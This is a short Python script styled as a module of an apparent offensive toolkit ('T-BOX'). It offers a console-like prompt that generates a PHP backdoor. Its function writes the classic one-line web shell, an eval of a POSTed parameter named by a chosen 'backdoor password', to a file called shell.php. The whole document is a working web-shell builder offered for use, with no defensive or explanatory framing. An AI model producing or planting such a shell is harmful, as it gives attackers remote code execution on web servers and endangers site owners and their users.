import os

password = '123456'

def summon_php(password):
    f = open('shell.txt','w')
    f.write("<?php @eval($_POST['")
    f.write(password)
    f.write("']); ?>")
    f.close()
    os.rename('shell.txt','shell.php')
    print('[*]生成完毕  R > /shell.php','    password: '+password)

while True:
    
    cmd = input('T-BOX auxiliary(summon/php) >')
    
    if cmd == 'show options':
        print('                                                          ')
        print('----------name---------content------------present---------')
        print('        password     ' + password + '           后门密码    ')
        print('                                                          ')

    elif cmd == '':    
        pass

    elif cmd[:13] == 'set password ':
        password = cmd[13:]
        print('[*]password ==> '+password)

    elif cmd == 'run':
        print('start.......')
        summon_php(password=password)
    
    elif cmd == 'back':
        break
    
    else:
        print("[-]can't find command: " + cmd)
    
